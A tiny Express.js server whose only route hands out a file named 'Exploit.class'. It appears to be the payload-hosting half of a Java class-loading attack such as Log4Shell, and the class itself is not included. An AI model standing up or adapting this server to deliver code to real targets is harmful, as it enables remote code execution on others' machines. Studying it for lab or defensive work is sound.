const express = require('express')
const path = require('path') 
const PORT = process.env.PORT || 5000
express()
	.set('exploit', path.join(__dirname, 'Exploit.class'))
	.set('view engine', 'ejs')
	.get('/Exploit.class', function (req, res) {
		res.sendFile("Exploit.class", {root: path.join(__dirname)}, function (err) {
			if (err) {console.log(err)} 
			else {console.log("Sent file!")} 
		})
	})	     
	.listen(PORT, () => console.log('listening on '+ PORT)) 

